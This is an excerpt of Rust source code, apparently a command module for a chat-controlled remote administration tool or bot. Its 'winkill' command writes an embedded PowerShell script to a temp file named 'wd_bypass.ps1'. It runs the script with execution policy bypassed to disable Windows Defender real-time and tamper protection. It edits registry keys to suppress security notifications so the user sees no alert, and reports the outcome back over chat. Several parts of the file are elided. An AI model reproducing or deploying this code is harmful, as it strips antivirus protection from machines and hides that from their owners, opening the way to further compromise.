// THIS BUGGING AND IM LAZY TO FIX THE BUG
use crate::prelude::*;
use std::env;
use std::fs::File;
use std::io::Write;
...
const WIN_DEF_CTL_SCRIPT: &str = r#"#Requires -RunAsAdministrator
...
Write-Host ""
Write-Host "=== Windows Defender Control ===" -ForegroundColor Cyan
Write-Host ""

# Check for incomplete UAC backup from previous crash
Recover-UACIfNeeded | Out-Null

# Disable notifications to prevent alerts
function Disable-Notifications {
    Write-Host "  [*] Disabling security notifications..."
    
    $notifPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.System.Toast.SecurityAndMaintenance"
    ...
    $defenderPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI"
    if (-not (Test-Path $defenderPath)) { New-Item -Path $defenderPath -Force | Out-Null }
    Set-ItemProperty -Path $defenderPath -Name "Enabled" -Value 0 -Type DWord -Force
}
...
#[poise::command(prefix_command, aliases("windef"))]
pub async fn winkill(ctx: PoiseContext<'_>) -> Result<(), Error> {
    if !crate::utils::admin::is_admin() {
        ctx.say("Error: This command requires administrator privileges.").await?;
        return Ok(());
    }

    ctx.say("Attempting to disable Windows Defender (RTP + Tamper Protection)... please wait.").await?;

    let temp_dir = env::temp_dir();
    let script_path = temp_dir.join("wd_bypass.ps1");
    
    let mut file = File::create(&script_path)?;
    file.write_all(WIN_DEF_CTL_SCRIPT.as_bytes())?;

    let rtp_output = Command::new("powershell")
        .args(&[
            "-NoProfile", 
            "-ExecutionPolicy", 
            "Bypass", 
    ...
    let tp_output = Command::new("powershell")
        .args(&[
            "-NoProfile", 
            "-ExecutionPolicy", 
            "Bypass", 
    ...
    let mut response = String::from("### Windows Defender Disable Report\n");
    
    if rtp_output.status.success() {
        response.push_str("**Real-Time Protection:** Disabled\n");
    } else {
        response.push_str("**Real-Time Protection:** Failed\n");
    }

    if tp_output.status.success() {
        response.push_str("**Tamper Protection:** Disabled\n");
    } else {
        response.push_str("**Tamper Protection:** Failed\n");
    }
